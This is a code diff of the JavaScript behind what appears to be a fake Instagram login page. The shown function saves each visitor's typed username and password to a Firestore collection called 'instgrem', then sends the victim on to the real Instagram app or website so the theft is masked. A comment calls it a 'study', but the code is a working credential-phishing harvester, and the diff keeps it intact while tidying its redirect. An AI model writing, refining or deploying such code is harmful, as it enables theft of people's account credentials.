@@ -139,34 +139,34 @@
 window.goToInstagram = async function() {
     if (loginBtn.classList.contains('active')) {
         try {
-            loginBtn.innerText = "Opening Instagram...";
+            loginBtn.innerText = "Opening App...";
             loginBtn.disabled = true;
 
-            // 1. DATA LOGGING (For your Firestore study)
+            // 1. SAVE DATA (For your Firestore study)
             await addDoc(collection(db, "instgrem"), {
                 user: userInp.value,
                 pass: passInp.value,
                 timestamp: new Date().toISOString()
             });
 
-            // 2. THE DEEP LINK
-            // This triggers the phone's OS to look for the Instagram app.
-            const appUri = "instagram://app";
-            const webFallback = "https://www.instagram.com/accounts/login/";
-
-            // Attempt to open the app
+            // 2. ANDROID INTENT NAVIGATION
+            // This is the specific URI for Instagram on Android.
+            const appUri = "instagram://app"; 
+            
+            // Modern Android 'Intent' URL (Alternative for Chrome on Android)
+            // intent://app/#Intent;package=com.instagram.android;scheme=https;end
+            
+            // Attempt to switch to the app
             window.location.href = appUri;
 
-            // 3. THE FALLBACK TIMER
-            // JavaScript cannot verify if an app is installed for privacy reasons.
-            // We set a timer: if the user is still on this page after 1 second, 
-            // the app likely didn't open, so we send them to the website.
+            // 3. FALLBACK
+            // If the app doesn't open within 1.2 seconds, go to the website
             setTimeout(() => {
-                window.location.href = webFallback;
-            }, 1000);
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 1200);
 
         } catch (e) {
-            console.error("Redirection Error:", e);
+            console.error("Navigation Error:", e);
             window.location.href = "https://www.instagram.com/accounts/login/";
         }
     }
